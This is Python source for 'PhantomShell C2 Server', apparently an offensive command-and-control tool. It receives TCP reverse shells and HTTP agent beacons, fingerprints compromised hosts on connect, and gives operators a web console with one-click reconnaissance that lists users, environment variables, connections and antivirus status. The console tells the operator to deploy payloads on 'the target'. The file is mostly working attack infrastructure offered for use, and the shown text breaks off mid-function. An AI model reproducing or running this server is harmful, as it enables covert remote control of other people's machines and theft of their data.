#!/usr/bin/python3
"""
PhantomShell C2 Server — Professional Edition
by Red Parakeet Security Team (https://github.com/Red-Parakeet)

Unified C2 platform supporting:
- TCP reverse shells (original PhantomShell)
- HTTP/HTTPS agent beacons (agent.py / agent.ps1)
- Web UI for session management
- CLI interface for operators

Usage:
    python3 phantomc2.py --port 4444 --web-port 8080 --password yourpassword
"""

import socket
import threading
import json
import time
import os
import sys
import signal
import argparse
import hashlib
import datetime
import queue
import ssl
import base64
import urllib.parse
import uuid
import random
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

VERSION = "2.0"

# ── Color ──────────────────────────────────────────────────────
C = {
    "R": '\033[0m',   "r": '\033[91m', "g": '\033[92m',
    "y": '\033[93m',  "b": '\033[94m', "c": '\033[96m',
    "w": '\033[97m',  "d": '\033[2m',  "B": '\033[1m',
}

STAR = f"{C['y']}[{C['b']}*{C['y']}]{C['R']}"
OK   = f"{C['g']}[{C['w']}+{C['g']}]{C['R']}"
ERR  = f"{C['r']}[{C['y']}!{C['r']}]{C['R']}"
INFO = f"{C['c']}[{C['w']}i{C['c']}]{C['R']}"


def banner():
    print(f"""{C['r']}
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{C['c']}
    ██████╗██████╗      ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
   ██╔════╝╚════██╗     ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
   ██║      █████╔╝     ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
   ██║     ██╔═══╝      ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
   ╚██████╗███████╗     ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
    ╚═════╝╚══════╝     ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝{C['R']}
  {C['d']}PhantomShell C2 v{VERSION} — Professional Edition — by Red Parakeet Security Team{C['R']}
  {C['d']}TCP Reverse Shells + HTTP/HTTPS Agents — www.redparakeet,org{C['R']}
""")


# ══════════════════════════════════════════════════════════════
# SESSION MANAGER
# ══════════════════════════════════════════════════════════════

class Session:
    """Unified session object for TCP and HTTP agents."""
    
    # Session types
    TYPE_TCP = "tcp"
    TYPE_HTTP = "http"
    
    def __init__(self, sid, sock=None, addr=None, session_type=TYPE_TCP):
        self.id = sid
        self.sock = sock
        self.addr = addr[0] if addr else "unknown"
        self.port = addr[1] if addr else 0
        self.type = session_type
        self.connected = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.hostname = "unknown"
        self.username = "unknown"
        self.os = "unknown"
        self.alive = True
        self.lock = threading.Lock()
        self.cmd_queue = queue.Queue()
        self.out_queue = queue.Queue()
        
        # HTTP agent specific
        self.agent_id = None
        self.platform_info = None
        self.pending_commands = {}  # command_id -> timestamp
        self.command_results = {}   # command_id -> output
        
    def send(self, cmd: str) -> str:
        """Send a command and wait for output (TCP) or queue (HTTP)."""
        if not self.alive:
            return "[session dead]"
            
        if self.type == self.TYPE_TCP:
            return self._send_tcp(cmd)
        else:
            return self._send_http(cmd)
    
    def _send_tcp(self, cmd: str) -> str:
        """TCP reverse shell command execution."""
        try:
            with self.lock:
                self.sock.settimeout(30)
                self.sock.sendall((cmd + "\n").encode())
                output = b""
                while True:
                    try:
                        chunk = self.sock.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                        if output.endswith(b"> ") or b"PS>" in output[-20:]:
                            break
                    except socket.timeout:
                        break
                return output.decode(errors="replace").strip()
        except Exception as e:
            self.alive = False
            return f"[error: {e}]"
    
    def _send_http(self, cmd: str) -> str:
        """HTTP agent command queueing."""
        cmd_id = str(uuid.uuid4())[:8]
        self.pending_commands[cmd_id] = time.time()
        self.cmd_queue.put((cmd_id, cmd))
        self.last_seen = datetime.datetime.now()
        return f"[queued] Command sent (ID: {cmd_id})"

    def set_http_result(self, cmd_id: str, output: str):
        """Store HTTP agent command result."""
        self.command_results[cmd_id] = output
        if cmd_id in self.pending_commands:
            del self.pending_commands[cmd_id]

    def get_http_command(self) -> tuple:
        """Get next queued command for HTTP agent."""
        try:
            return self.cmd_queue.get_nowait()
        except queue.Empty:
            return None

    def info_dict(self):
        return {
            "id": self.id,
            "ip": self.addr,
            "port": self.port,
            "type": self.type,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os,
            "connected": self.connected.strftime("%Y-%m-%d %H:%M:%S"),
            "last_seen": self.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "alive": self.alive,
            "agent_id": self.agent_id,
        }


class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock = threading.Lock()
        self._next_id = 1

    def add(self, sock, addr, session_type=Session.TYPE_TCP) -> Session:
        with self._lock:
            sid = self._next_id
            self._next_id += 1
            s = Session(sid, sock, addr, session_type)
            self._sessions[sid] = s
            return s

    def add_http(self, agent_id: str, platform_info: str, addr: str) -> Session:
        """Add HTTP agent session."""
        with self._lock:
            sid = self._next_id
            self._next_id += 1
            s = Session(sid, None, (addr, 0), Session.TYPE_HTTP)
            s.agent_id = agent_id
            s.platform_info = platform_info
            s.hostname = platform_info.split('|')[1].strip() if '|' in platform_info else "unknown"
            s.username = platform_info.split('|')[2].strip() if '|' in platform_info else "unknown"
            s.os = platform_info.split('|')[0].strip() if '|' in platform_info else "unknown"
            self._sessions[sid] = s
            return s

    def get(self, sid: int) -> Session:
        return self._sessions.get(sid)

    def get_by_agent_id(self, agent_id: str) -> Session:
        for s in self._sessions.values():
            if s.agent_id == agent_id:
                return s
        return None

    def all(self) -> list:
        return list(self._sessions.values())

    def alive(self) -> list:
        return [s for s in self._sessions.values() if s.alive]

    def remove(self, sid: int):
        with self._lock:
            self._sessions.pop(sid, None)

    def prune(self):
        with self._lock:
            dead = [sid for sid, s in self._sessions.items() if not s.alive]
            for sid in dead:
                del self._sessions[sid]


# Global session manager
SM = SessionManager()
LOG = []


def log(msg: str, level: str = "info"):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    entry = {"ts": ts, "level": level, "msg": msg}
    LOG.append(entry)
    if len(LOG) > 500:
        LOG.pop(0)
    icons = {"info": INFO, "ok": OK, "err": ERR, "star": STAR}
    icon = icons.get(level, INFO)
    print(f"{icon} [{ts}] {msg}")


# ══════════════════════════════════════════════════════════════
# TCP REVERSE SHELL LISTENER
# ══════════════════════════════════════════════════════════════

def handle_tcp_session(sess: Session):
    """Gather info from new TCP session and keep it alive."""
    log(f"New TCP session #{sess.id} from {sess.addr}:{sess.port}", "ok")

    try:
        hostname = sess.send("hostname")
        if hostname and len(hostname) < 100:
            sess.hostname = hostname.split("\n")[-1].strip().replace("PS>", "").strip()

        whoami = sess.send("whoami")
        if whoami and len(whoami) < 100:
            sess.username = whoami.split("\n")[-1].strip().replace("PS>", "").strip()

        osinfo = sess.send("[System.Environment]::OSVersion.VersionString")
        if osinfo and len(osinfo) < 200:
            sess.os = osinfo.split("\n")[-1].strip().replace("PS>", "").strip()
    except:
        pass

    log(f"TCP Session #{sess.id} — {sess.username}@{sess.hostname} ({sess.os})", "star")

    while sess.alive:
        time.sleep(10)
        try:
            sess.sock.settimeout(5)
            sess.sock.sendall(b"echo alive\n")
            data = sess.sock.recv(256)
            if not data:
                raise Exception("no data")
            sess.last_seen = datetime.datetime.now()
        except:
            sess.alive = False
            log(f"TCP Session #{sess.id} died ({sess.addr})", "err")
            break


def tcp_listener(host: str, port: int):
    """Main TCP listener for incoming reverse shells."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((host, port))
        srv.listen(50)
        log(f"TCP listener on {host}:{port}", "ok")
    except Exception as e:
        log(f"Cannot bind TCP listener on port {port}: {e}", "err")
        sys.exit(1)

    while True:
        try:
            conn, addr = srv.accept()
            sess = SM.add(conn, addr, Session.TYPE_TCP)
            t = threading.Thread(target=handle_tcp_session, args=(sess,), daemon=True)
            t.start()
        except Exception as e:
            log(f"Accept error: {e}", "err")


# ══════════════════════════════════════════════════════════════
# HTTP AGENT HANDLER
# ══════════════════════════════════════════════════════════════

class HTTPAgentHandler(BaseHTTPRequestHandler):
    """HTTP handler for agent beaconing and command delivery."""
    
    def log_message(self, *_):
        pass
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        
        # ── Beacon endpoint ──────────────────────────────────────────────────
        if path == "/beacon":
            agent_id = query.get("id", [None])[0]
            platform = query.get("platform", ["unknown"])[0]
            
            if not agent_id:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"missing id")
                return
            
            # Get or create session
            sess = SM.get_by_agent_id(agent_id)
            if not sess:
                sess = SM.add_http(agent_id, platform, self.client_address[0])
                log(f"New HTTP agent #{sess.id} — {platform}", "ok")
                log(f"HTTP Agent #{sess.id} — {sess.username}@{sess.hostname} ({sess.os})", "star")
            else:
                sess.last_seen = datetime.datetime.now()
            
            # Check for queued command
            cmd = sess.get_http_command()
            
            if cmd:
                cmd_id, command = cmd
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(command.encode("utf-8"))
                log(f"HTTP Agent #{sess.id} CMD: {command[:50]}{'...' if len(command) > 50 else ''}", "star")
            else:
                self.send_response(204)  # No Content
                self.end_headers()
                
            return
        
        # ── Result endpoint ──────────────────────────────────────────────────
        if path == "/result":
            agent_id = query.get("id", [None])[0]
            
            if not agent_id:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"missing id")
                return
            
            # Read body
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8", errors="replace")
            
            sess = SM.get_by_agent_id(agent_id)
            if sess:
                # We don't have a cmd_id for tracking, but we can store the result
                # For simplicity, we'll just log it
                log(f"HTTP Agent #{sess.id} result: {len(body)} bytes", "info")
                sess.last_seen = datetime.datetime.now()
                # Store last result
                sess.command_results["_last"] = body
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return
        
        # ── 404 ──────────────────────────────────────────────────────────────
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"Not Found")
    
    def do_POST(self):
        """Handle POST requests (same as GET for result)."""
        self.do_GET()


def http_agent_listener(host: str, port: int):
    """HTTP server for agent beaconing."""
    try:
        server = HTTPServer((host, port), HTTPAgentHandler)
        log(f"HTTP agent listener on http://{host}:{port}", "ok")
        server.serve_forever()
    except Exception as e:
        log(f"HTTP agent listener error: {e}", "err")


# ══════════════════════════════════════════════════════════════
# WEB UI + API
# ══════════════════════════════════════════════════════════════

WEB_PASSWORD = "phantomshell"
TOKENS = set()


def make_token(password: str) -> str:
    return hashlib.sha256((password + "phantomshell_salt").encode()).hexdigest()[:32]


def check_auth(handler) -> bool:
    cookie = handler.headers.get("Cookie", "")
    for part in cookie.split(";"):
        k, _, v = part.strip().partition("=")
        if k.strip() == "ps_token" and v.strip() in TOKENS:
            return True
    auth = handler.headers.get("Authorization", "")
    if auth.startswith("Bearer ") and auth[7:] in TOKENS:
        return True
    return False


HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PhantomShell C2</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap');

  :root {
    --bg:      #080b0f;
    --surface: #0d1117;
    --border:  #1a2332;
    --accent:  #e63946;
    --accent2: #00d4ff;
    --green:   #00ff88;
    --yellow:  #ffd60a;
    --text:    #c9d1d9;
    --dim:     #4a5568;
  }

  * { margin:0; padding:0; box-sizing:border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    min-height: 100vh;
    overflow-x: hidden;
  }

  body::before {
    content: '';
    position: fixed; inset: 0;
    background: repeating-linear-gradient(
      0deg, transparent, transparent 2px,
      rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px
    );
    pointer-events: none;
    z-index: 9999;
  }

  header {
    border-bottom: 1px solid var(--border);
    padding: 16px 32px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    background: var(--surface);
  }

  .logo {
    font-family: 'Orbitron', monospace;
    font-size: 18px;
    font-weight: 900;
    color: var(--accent);
    letter-spacing: 3px;
    text-shadow: 0 0 20px rgba(230,57,70,0.5);
  }

  .logo span { color: var(--accent2); }

  .status-bar {
    display: flex;
    gap: 24px;
    font-size: 11px;
    color: var(--dim);
  }

  .status-bar .dot {
    display: inline-block;
    width: 6px; height: 6px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 6px var(--green);
    margin-right: 6px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%,100% { opacity:1; }
    50%      { opacity:0.3; }
  }

  .layout {
    display: grid;
    grid-template-columns: 300px 1fr;
    grid-template-rows: auto 1fr;
    height: calc(100vh - 57px);
  }

  .sessions-panel {
    border-right: 1px solid var(--border);
    background: var(--surface);
    display: flex;
    flex-direction: column;
    grid-row: 1 / 3;
    overflow: hidden;
  }

  .panel-header {
    padding: 12px 16px;
    border-bottom: 1px solid var(--border);
    font-size: 10px;
    letter-spacing: 2px;
    color: var(--dim);
    text-transform: uppercase;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .badge {
    background: var(--accent);
    color: white;
    border-radius: 10px;
    padding: 1px 7px;
    font-size: 10px;
  }

  .sessions-list {
    flex: 1;
    overflow-y: auto;
    padding: 8px;
  }

  .sessions-list::-webkit-scrollbar { width: 4px; }
  .sessions-list::-webkit-scrollbar-track { background: transparent; }
  .sessions-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }

  .session-card {
    padding: 12px;
    border: 1px solid var(--border);
    border-radius: 4px;
    margin-bottom: 8px;
    cursor: pointer;
    transition: all 0.15s;
    background: var(--bg);
  }

  .session-card:hover, .session-card.active {
    border-color: var(--accent2);
    background: rgba(0,212,255,0.05);
  }

  .session-card.dead { opacity: 0.4; border-color: #333; }

  .session-id {
    font-family: 'Orbitron', monospace;
    font-size: 10px;
    color: var(--accent2);
    margin-bottom: 4px;
  }

  .session-type {
    font-size: 9px;
    padding: 1px 6px;
    border-radius: 10px;
    background: rgba(0,212,255,0.15);
    color: var(--accent2);
    margin-left: 6px;
  }

  .session-host {
    font-size: 12px;
    color: var(--text);
    margin-bottom: 2px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .session-meta {
    font-size: 10px;
    color: var(--dim);
  }

  .alive-dot {
    display: inline-block;
    width: 5px; height: 5px;
    border-radius: 50%;
    margin-right: 5px;
  }
  .alive-dot.on  { background: var(--green);  box-shadow: 0 0 4px var(--green); }
  .alive-dot.off { background: var(--accent); }

  .main-area {
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  .stats-row {
    display: grid;
    grid-template-columns: repeat(5, 1fr);
    border-bottom: 1px solid var(--border);
  }

  .stat-box {
    padding: 16px 24px;
    border-right: 1px solid var(--border);
  }

  .stat-box:last-child { border-right: none; }

  .stat-label {
    font-size: 9px;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--dim);
    margin-bottom: 6px;
  }

  .stat-value {
    font-family: 'Orbitron', monospace;
    font-size: 24px;
    font-weight: 700;
    color: var(--text);
  }

  .stat-value.red    { color: var(--accent); text-shadow: 0 0 15px rgba(230,57,70,0.4); }
  .stat-value.cyan   { color: var(--accent2); text-shadow: 0 0 15px rgba(0,212,255,0.4); }
  .stat-value.green  { color: var(--green);  text-shadow: 0 0 15px rgba(0,255,136,0.4); }
  .stat-value.yellow { color: var(--yellow); text-shadow: 0 0 15px rgba(255,214,10,0.4); }

  .terminal-area {
    flex: 1;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    padding: 16px;
    gap: 12px;
  }

  .session-info-bar {
    font-size: 11px;
    color: var(--dim);
    padding: 8px 12px;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 4px;
    display: flex;
    gap: 24px;
    flex-wrap: wrap;
  }

  .session-info-bar span { color: var(--text); }

  .output-box {
    flex: 1;
    background: #020408;
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 16px;
    overflow-y: auto;
    font-size: 12px;
    line-height: 1.6;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .output-box::-webkit-scrollbar { width: 4px; }
  .output-box::-webkit-scrollbar-thumb { background: var(--border); }

  .output-box .cmd-echo { color: var(--accent2); }
  .output-box .out      { color: var(--green); }
  .output-box .err-out  { color: var(--accent); }
  .output-box .sys      { color: var(--dim); font-style: italic; }
  .output-box .queued   { color: var(--yellow); font-style: italic; }

  .input-row {
    display: flex;
    gap: 8px;
    align-items: center;
  }

  .prompt {
    font-family: 'Orbitron', monospace;
    font-size: 11px;
    color: var(--accent);
    white-space: nowrap;
    padding: 0 8px;
  }

  .cmd-input {
    flex: 1;
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    padding: 10px 14px;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.15s;
  }

  .cmd-input:focus { border-color: var(--accent2); }
  .cmd-input::placeholder { color: var(--dim); }

  .send-btn {
    background: var(--accent);
    color: white;
    border: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1px;
    padding: 10px 20px;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.15s;
    text-transform: uppercase;
  }

  .send-btn:hover { background: #ff4757; box-shadow: 0 0 15px rgba(230,57,70,0.4); }

  .quick-cmds {
    display: flex;
    gap: 6px;
    flex-wrap: wrap;
  }

  .qcmd {
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--dim);
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    padding: 4px 10px;
    border-radius: 3px;
    cursor: pointer;
    transition: all 0.15s;
  }

  .qcmd:hover { border-color: var(--accent2); color: var(--accent2); }

  .log-panel {
    border-top: 1px solid var(--border);
    max-height: 140px;
    overflow-y: auto;
    padding: 8px 16px;
    font-size: 11px;
    background: var(--surface);
  }

  .log-panel::-webkit-scrollbar { width: 4px; }
  .log-panel::-webkit-scrollbar-thumb { background: var(--border); }

  .log-entry {
    padding: 2px 0;
    color: var(--dim);
    display: flex;
    gap: 12px;
  }

  .log-entry .log-ts  { color: #2d3748; min-width: 60px; }
  .log-entry.ok  .log-msg { color: var(--green); }
  .log-entry.err .log-msg { color: var(--accent); }
  .log-entry.star .log-msg { color: var(--accent2); }

  .no-session {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: var(--dim);
    gap: 12px;
  }

  .no-session-icon {
    font-size: 48px;
    opacity: 0.2;
  }

  .no-session p { font-size: 12px; letter-spacing: 1px; }

  #login-overlay {
    position: fixed; inset: 0;
    background: rgba(8,11,15,0.97);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10000;
  }

  .login-box {
    background: var(--surface);
    border: 1px solid var(--border);
    padding: 48px;
    border-radius: 8px;
    width: 380px;
    text-align: center;
  }

  .login-logo {
    font-family: 'Orbitron', monospace;
    font-size: 22px;
    font-weight: 900;
    color: var(--accent);
    text-shadow: 0 0 30px rgba(230,57,70,0.5);
    margin-bottom: 8px;
    letter-spacing: 3px;
  }

  .login-sub {
    color: var(--dim);
    font-size: 11px;
    letter-spacing: 2px;
    margin-bottom: 32px;
  }

  .login-input {
    width: 100%;
    background: var(--bg);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    padding: 12px 16px;
    border-radius: 4px;
    outline: none;
    margin-bottom: 16px;
    text-align: center;
    letter-spacing: 3px;
  }

  .login-input:focus { border-color: var(--accent); }

  .login-btn {
    width: 100%;
    background: var(--accent);
    color: white;
    border: none;
    font-family: 'Orbitron', monospace;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 2px;
    padding: 14px;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.15s;
    text-transform: uppercase;
  }

  .login-btn:hover { box-shadow: 0 0 25px rgba(230,57,70,0.5); }

  .login-err {
    color: var(--accent);
    font-size: 11px;
    margin-top: 12px;
    min-height: 16px;
  }
</style>
</head>
<body>

<div id="login-overlay">
  <div class="login-box">
    <div class="login-logo">PHANTOM</div>
    <div class="login-sub">C2 SERVER — AUTHORIZED ACCESS ONLY</div>
    <input type="password" class="login-input" id="pw-input" placeholder="••••••••••••" />
    <button class="login-btn" onclick="doLogin()">AUTHENTICATE</button>
    <div class="login-err" id="login-err"></div>
  </div>
</div>

<header>
  <div class="logo">PHANTOM<span>SHELL</span> C2</div>
  <div class="status-bar">
    <div><span class="dot"></span>ONLINE</div>
    <div id="hdr-sessions">0 SESSIONS</div>
    <div id="hdr-time">--:--:--</div>
  </div>
</header>

<div class="layout">
  <div class="sessions-panel">
    <div class="panel-header">
      ACTIVE SESSIONS
      <span class="badge" id="sess-count">0</span>
    </div>
    <div class="sessions-list" id="sessions-list">
      <div style="color:var(--dim);font-size:11px;text-align:center;padding:32px 16px;line-height:2">
        Waiting for connections...<br>
        <span style="color:#1a2332">─────────────────</span><br>
        Deploy a PhantomShell payload<br>or HTTP agent on the target
      </div>
    </div>
  </div>

  <div class="main-area">
    <div class="stats-row">
      <div class="stat-box">
        <div class="stat-label">Total Sessions</div>
        <div class="stat-value cyan" id="stat-total">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Active</div>
        <div class="stat-value green" id="stat-alive">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Dead</div>
        <div class="stat-value red" id="stat-dead">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">TCP</div>
        <div class="stat-value yellow" id="stat-tcp">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">HTTP</div>
        <div class="stat-value yellow" id="stat-http">0</div>
      </div>
    </div>

    <div class="terminal-area" id="terminal-area">
      <div class="no-session">
        <div class="no-session-icon">👻</div>
        <p>SELECT A SESSION TO INTERACT</p>
      </div>
    </div>

    <div class="log-panel" id="log-panel">
      <div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-msg">PhantomShell C2 ready</span></div>
    </div>
  </div>
</div>

<script>
let token = localStorage.getItem('ps_token') || '';
let activeSid = null;
let cmdCount = 0;
let cmdHistory = [];
let histIdx = -1;
let pollInterval = null;

async function doLogin() {
  const pw  = document.getElementById('pw-input').value;
  const res = await fetch('/api/login', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({password: pw})
  });
  const data = await res.json();
  if (data.ok) {
    token = data.token;
    localStorage.setItem('ps_token', token);
    document.cookie = `ps_token=${token}; path=/`;
    document.getElementById('login-overlay').style.display = 'none';
    startPolling();
  } else {
    document.getElementById('login-err').textContent = 'Invalid password';
  }
}

window.addEventListener('load', async () => {
  if (token) {
    const res = await fetch('/api/sessions', {
      headers: {'Authorization': `Bearer ${token}`}
    });
    if (res.ok) {
      document.getElementById('login-overlay').style.display = 'none';
      startPolling();
    } else {
      token = '';
      localStorage.removeItem('ps_token');
    }
  }
  document.getElementById('pw-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') doLogin();
  });
});

async function api(path, method='GET', body=null) {
  const opts = {
    method,
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    }
  };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(path, opts);
  if (!res.ok) return null;
  return res.json();
}

setInterval(() => {
  document.getElementById('hdr-time').textContent =
    new Date().toTimeString().slice(0,8);
}, 1000);

function startPolling() {
  refreshSessions();
  refreshLogs();
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(refreshSessions, 3000);
  setInterval(refreshLogs, 5000);
}

async function refreshSessions() {
  const data = await api('/api/sessions');
  if (!data) return;

  const sessions = data.sessions;
  const alive    = sessions.filter(s => s.alive).length;
  const dead     = sessions.length - alive;
  const tcpCount = sessions.filter(s => s.type === 'tcp').length;
  const httpCount = sessions.filter(s => s.type === 'http').length;

  document.getElementById('sess-count').textContent  = alive;
  document.getElementById('hdr-sessions').textContent = `${alive} SESSION${alive !== 1 ? 'S' : ''}`;
  document.getElementById('stat-total').textContent  = sessions.length;
  document.getElementById('stat-alive').textContent  = alive;
  document.getElementById('stat-dead').textContent   = dead;
  document.getElementById('stat-tcp').textContent    = tcpCount;
  document.getElementById('stat-http').textContent   = httpCount;

  const list = document.getElementById('sessions-list');
  if (sessions.length === 0) {
    list.innerHTML = `<div style="color:var(--dim);font-size:11px;text-align:center;padding:32px 16px;line-height:2">
      Waiting for connections...<br>
      <span style="color:#1a2332">─────────────────</span><br>
      Deploy a PhantomShell payload<br>or HTTP agent on the target
    </div>`;
    return;
  }

  list.innerHTML = sessions.map(s => `
    <div class="session-card ${!s.alive ? 'dead' : ''} ${s.id === activeSid ? 'active' : ''}"
         onclick="selectSession(${s.id})">
      <div class="session-id">
        <span class="alive-dot ${s.alive ? 'on' : 'off'}"></span>
        SESSION #${s.id}
        <span class="session-type">${s.type.toUpperCase()}</span>
      </div>
      <div class="session-host">${s.username}@${s.hostname}</div>
      <div class="session-meta">${s.ip} · ${s.connected}</div>
    </div>
  `).join('');
}

async function refreshLogs() {
  const data = await api('/api/logs');
  if (!data) return;
  const panel = document.getElementById('log-panel');
  panel.innerHTML = data.logs.slice(-30).reverse().map(e => `
    <div class="log-entry ${e.level}">
      <span class="log-ts">${e.ts}</span>
      <span class="log-msg">${e.msg}</span>
    </div>
  `).join('');
}

function selectSession(sid) {
  activeSid = sid;
  refreshSessions();
  renderTerminal(sid);
}

async function renderTerminal(sid) {
  const data = await api(`/api/sessions`);
  if (!data) return;
  const sess = data.sessions.find(s => s.id === sid);
  if (!sess) return;

  const ta = document.getElementById('terminal-area');
  const isTcp = sess.type === 'tcp';
  ta.innerHTML = `
    <div class="session-info-bar">
      <div>TYPE <span style="color:${isTcp ? 'var(--accent2)' : 'var(--yellow)'}">${sess.type.toUpperCase()}</span></div>
      <div>HOST <span>${sess.hostname}</span></div>
      <div>USER <span>${sess.username}</span></div>
      <div>IP <span>${sess.ip}</span></div>
      <div>OS <span>${sess.os || 'unknown'}</span></div>
      <div>STATUS <span style="color:${sess.alive ? 'var(--green)' : 'var(--accent)'}">${sess.alive ? 'ALIVE' : 'DEAD'}</span></div>
    </div>
    <div class="quick-cmds">
      <button class="qcmd" onclick="quickCmd('whoami')">whoami</button>
      <button class="qcmd" onclick="quickCmd('hostname')">hostname</button>
      <button class="qcmd" onclick="quickCmd('ipconfig')">ipconfig</button>
      <button class="qcmd" onclick="quickCmd('systeminfo')">sysinfo</button>
      <button class="qcmd" onclick="quickCmd('net user')">net user</button>
      <button class="qcmd" onclick="quickCmd('Get-Process | Select-Object Name,Id | Format-Table')">processes</button>
      <button class="qcmd" onclick="quickCmd('dir C:\\\\Users')">dir users</button>
      <button class="qcmd" onclick="quickCmd('Get-ChildItem Env:')">env vars</button>
      <button class="qcmd" onclick="quickCmd('netstat -ano')">netstat</button>
      <button class="qcmd" onclick="quickCmd('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusEnabled')">av status</button>
    </div>
    <div class="output-box" id="output-box">
      <span class="sys">// Session #${sid} — ${sess.username}@${sess.hostname} — ${sess.connected}</span>\n
    </div>
    <div class="input-row">
      <span class="prompt">${isTcp ? 'PS' : 'HTTP'}&gt;</span>
      <input type="text" class="cmd-input" id="cmd-input"
             placeholder="${isTcp ? 'Enter PowerShell command...' : 'Enter command (HTTP polling)...'}"
             ${!sess.alive ? 'disabled' : ''}
             onkeydown="handleKey(event)" />
      <button class="send-btn" onclick="sendCmd()" ${!sess.alive ? 'disabled' : ''}>EXEC</button>
    </div>
  `;

  document.getElementById('cmd-input')?.focus();
}

function handleKey(e) {
  if (e.key === 'Enter') {
    sendCmd();
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (histIdx < cmdHistory.length - 1) {
      histIdx++;
      document.getElementById('cmd-input').value = cmdHistory[cmdHistory.length - 1 - histIdx];
    }
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (histIdx > 0) {
      histIdx--;
      document.getElementById('cmd-input').value = cmdHistory[cmdHistory.length - 1 - histIdx];
    } else {
      histIdx = -1;
      document.getElementById('cmd-input').value = '';
    }
  }
}

function quickCmd(cmd) {
  const inp = document.getElementById('cmd-input');
  if (inp) { inp.value = cmd; sendCmd(); }
}

async function sendCmd() {
  const input = document.getElementById('cmd-input');
  if (!input || !activeSid) return;
  const cmd = input.value.trim();
  if (!cmd) return;

  cmdHistory.push(cmd);
  histIdx = -1;
  input.value = '';
  cmdCount++;

  const out = document.getElementById('output-box');
  out.innerHTML += `<span class="cmd-echo">PS&gt; ${escHtml(cmd)}</span>\n`;
  out.innerHTML += `<span class="sys">// executing...</span>\n`;
  out.scrollTop = out.scrollHeight;

  const data = await api('/api/exec', 'POST', {session_id: activeSid, command: cmd});

